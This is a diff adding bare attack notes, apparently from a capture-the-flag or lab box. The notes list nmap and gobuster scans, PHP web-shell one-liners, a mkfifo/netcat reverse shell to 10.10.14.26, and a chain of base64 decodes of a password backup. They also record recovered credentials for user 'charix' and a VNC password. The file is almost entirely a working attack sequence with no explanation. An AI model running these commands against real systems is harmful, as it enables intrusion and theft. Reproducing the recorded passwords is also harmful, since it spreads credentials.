@@ -1,0 +1,25 @@
+nmap  -sC -sV   10.129.102.0   -Pn > nmap.txt
+gobuster dir  -u http://10.129.102.0/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x txt,php,py,cgi > gobuster.txt
+
+charix
+
+<?php echo system($_REQUEST["cmd"]); ?>
+<?php echo system($_REQUEST[\"cmd\"]); ?>
+<?php echo system($_REQUEST['cmd']); ?>
+
+
+
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.26 4444 >/tmp/f
+
+base64 -d pwdbackup.txt |base64 -d|base64 -d|base64 -d|base64 -d|base64 -d|base64 -d|base64 -d|base64 -d|base64 -d|base64 -d|base64 -d|base64 -d
+charix
+Charix!2#4%6&8(0
+
+
+
+ssh -L5901:localhost:5901 charix@10.129.102.0
+
+https://github.com/trinitronx/vncpasswd.py.git
+
+
+VNCP@$$!
